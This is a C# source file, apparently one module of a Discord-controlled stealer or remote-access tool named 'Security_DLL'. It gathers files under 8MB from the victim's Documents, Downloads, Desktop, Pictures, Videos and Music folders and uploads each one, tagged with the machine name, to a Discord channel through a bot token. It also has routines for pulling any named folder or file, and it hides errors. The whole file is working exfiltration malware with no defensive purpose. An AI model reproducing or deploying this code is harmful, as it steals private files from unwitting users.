using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace Security_DLL
{
    internal class Files
    {
        private static readonly string BotToken = "";
        private static readonly ulong CanalID = 0;

        public static async Task EnviarArchivosUsuario()
        {
            try
            {
                await EnviarMensaje("📁 **Buscando y enviando archivos...**");

                string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string downloads = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
                string videos = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                string music = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

                List<string> carpetas = new List<string> { documents, downloads, desktop, pictures, videos, music };
                List<string> archivosEnviados = new List<string>();
                int totalEnviados = 0;

                foreach (string carpeta in carpetas)
                {
                    if (Directory.Exists(carpeta))
                    {
                        try
                        {
                            var archivos = Directory.GetFiles(carpeta, "*.*", SearchOption.TopDirectoryOnly);
                            foreach (string archivo in archivos)
                            {
                                try
                                {
                                    FileInfo info = new FileInfo(archivo);
                                    // Archivos menores a 8MB (límite de Discord para archivos)
                                    if (info.Length < 8388608 && ExtensionesPermitidas(info.Extension))
                                    {
                                        await EnviarArchivoADiscord(archivo, Path.GetFileName(carpeta));
                                        archivosEnviados.Add(info.Name);
                                        totalEnviados++;
                                        await Task.Delay(1000); // Esperar 1 segundo entre archivos
                                    }
                                }
                                catch { }
                            }
                        }
                        catch { }
                    }
                }

                if (totalEnviados == 0)
                {
                    await EnviarMensaje("📁 **No se encontraron archivos para enviar** (menores a 8MB)");
                }
                else
                {
                    await EnviarMensaje($"✅ **Se enviaron {totalEnviados} archivos**\n📁 Desde: Descargas, Documentos, Escritorio, Imágenes, Videos, Música");
                }
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        public static async Task EnviarArchivosDeCarpeta(string carpetaPath)
        {
            try
            {
                if (!Directory.Exists(carpetaPath))
                {
                    await EnviarMensaje($"❌ Carpeta no encontrada: {carpetaPath}");
                    return;
                }

                await EnviarMensaje($"📁 **Enviando archivos de: {Path.GetFileName(carpetaPath)}**");

                var archivos = Directory.GetFiles(carpetaPath, "*.*", SearchOption.TopDirectoryOnly);
                int enviados = 0;

                foreach (string archivo in archivos)
                {
                    FileInfo info = new FileInfo(archivo);
                    if (info.Length < 8388608 && ExtensionesPermitidas(info.Extension))
                    {
                        await EnviarArchivoADiscord(archivo, Path.GetFileName(carpetaPath));
                        enviados++;
                        await Task.Delay(1000);
                    }
                }

                await EnviarMensaje($"✅ **{enviados} archivos enviados desde {Path.GetFileName(carpetaPath)}**");
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        public static async Task EnviarArchivoEspecifico(string rutaArchivo)
        {
            try
            {
                if (!File.Exists(rutaArchivo))
                {
                    await EnviarMensaje($"❌ Archivo no encontrado: {rutaArchivo}");
                    return;
                }

                FileInfo info = new FileInfo(rutaArchivo);
                if (info.Length > 8388608)
                {
                    await EnviarMensaje($"❌ Archivo demasiado grande: {info.Name} ({info.Length / 1024 / 1024}MB)");
                    return;
                }

                await EnviarArchivoADiscord(rutaArchivo, "Archivo específico");
                await EnviarMensaje($"✅ **Archivo enviado:** {info.Name}");
            }
            catch (Exception ex)
            {
                await EnviarMensaje($"❌ Error: {ex.Message}");
            }
        }

        private static async Task EnviarArchivoADiscord(string rutaArchivo, string carpetaOrigen)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(60);
                    client.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");

                    byte[] fileData = File.ReadAllBytes(rutaArchivo);
                    FileInfo info = new FileInfo(rutaArchivo);

                    using (var formData = new MultipartFormDataContent())
                    {
                        var fileContent = new ByteArrayContent(fileData);
                        string mimeType = ObtenerMimeType(info.Extension);
                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue(mimeType);
                        formData.Add(fileContent, "file", info.Name);

                        // Mensaje de contexto
                        var mensajeContexto = new StringContent(JsonConvert.SerializeObject(new
                        {
                            content = $"📄 **Archivo:** {info.Name}\n📁 **Carpeta:** {carpetaOrigen}\n💻 **PC:** {Environment.MachineName}\n📏 **Tamaño:** {FormatearTamaño(info.Length)}"
                        }), Encoding.UTF8, "application/json");
                        formData.Add(mensajeContexto, "payload_json");

                        string url = $"https://discord.com/api/v10/channels/{CanalID}/messages";
                        HttpResponseMessage response = await client.PostAsync(url, formData);

                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine($"Archivo enviado: {info.Name}");
                        }
                        else
                        {
                            string error = await response.Content.ReadAsStringAsync();
                            Console.WriteLine($"Error enviando {info.Name}: {error}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enviando archivo: {ex.Message}");
            }
        }

        private static bool ExtensionesPermitidas(string extension)
        {
            string ext = extension.ToLower();
            string[] permitidas = {
                ".txt", ".doc", ".docx", ".pdf", ".jpg", ".jpeg", ".png",
                ".xls", ".xlsx", ".zip", ".rar", ".7z", ".xml", ".json",
                ".csv", ".ppt", ".pptx", ".mp3", ".mp4", ".avi", ".mov",
                ".gif", ".bmp", ".psd", ".ai", ".cdr", ".dwg", ".exe", ".msi"
            };
            return permitidas.Contains(ext);
        }

        private static string ObtenerMimeType(string extension)
        {
            string ext = extension.ToLower();
            var mimeTypes = new Dictionary<string, string>
            {
                { ".txt", "text/plain" },
                { ".doc", "application/msword" },
                { ".docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document" },
                { ".pdf", "application/pdf" },
                { ".jpg", "image/jpeg" },
                { ".jpeg", "image/jpeg" },
                { ".png", "image/png" },
                { ".xls", "application/vnd.ms-excel" },
                { ".xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" },
                { ".zip", "application/zip" },
                { ".rar", "application/x-rar-compressed" },
                { ".mp3", "audio/mpeg" },
                { ".mp4", "video/mp4" },
                { ".exe", "application/octet-stream" }
            };

            return mimeTypes.ContainsKey(ext) ? mimeTypes[ext] : "application/octet-stream";
        }

        private static string FormatearTamaño(long bytes)
        {
            if (bytes < 1024) return $"{bytes} B";
            if (bytes < 1024 * 1024) return $"{bytes / 1024} KB";
            return $"{bytes / 1024 / 1024} MB";
        }

        private static async Task EnviarMensaje(string mensaje)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");
                    var payload = new { content = mensaje };
                    string json = JsonConvert.SerializeObject(payload);
                    var content = new StringContent(json, Encoding.UTF8, "application/json");
                    string url = $"https://discord.com/api/v10/channels/{CanalID}/messages";
                    await client.PostAsync(url, content);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
}